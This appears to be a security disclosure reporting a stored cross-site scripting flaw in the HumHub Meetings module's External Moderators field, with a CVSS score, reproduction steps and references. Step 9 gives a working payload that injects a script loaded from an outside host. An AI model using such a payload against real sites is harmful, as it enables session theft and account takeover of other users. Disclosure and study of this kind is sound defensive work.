## Severity

CVSS:4.0/AV:N/AC:L/AT:P/PR:H/UI:P/VC:H/VI:H/VA:H/SC:N/SI:N/SA:N

## Environment

HumHub Professional Edition Demo version `1.18.1`, at https://lassitesting.humhub.com

Meetings module version `0.9.0` (https://marketplace.humhub.com/module/meeting)

Created at https://saas.humhub.com/en/create on 23.2.2026, updated to `1.18.1` on 3.3.2026 by the lovely HumHub team.

## Steps to reproduce

1. Log in to your **HumHub** instance with an administrator user. In this example, the default `admin` account was used
2. Navigate to **top-right menu > Administration > Modules** and install the **Meetings** module if not already installed
3. Navigate to a space of your choosing, in this example the default **Welcome Space**
4. From the right corner gear menu, select **Settings** and **Enable** the **Meetings** module
5. Navigate to the **Meetings** module and click on **New meeting**
![](attachments/Pasted%20image%2020260313212913.png)
6. Enter any name and click **Save**
7. Click on **New agenda entry**
![](attachments/Pasted%20image%2020260313212917.png)
8. Enter anything as the **Title**
9. Under **External moderators > External Moderators** field, enter the following XSS payload:
```html
"><script src=https://useful-writer.surge.sh/alert_domain.js></script>
```
10. Click Save
11. XSS is fired immediately:
![](attachments/Pasted%20image%2020260313212920.png)

## Code References

None, code not available

## External references

https://cwe.mitre.org/data/definitions/79.html
https://owasp.org/www-community/attacks/xss/
https://portswigger.net/web-security/cross-site-scripting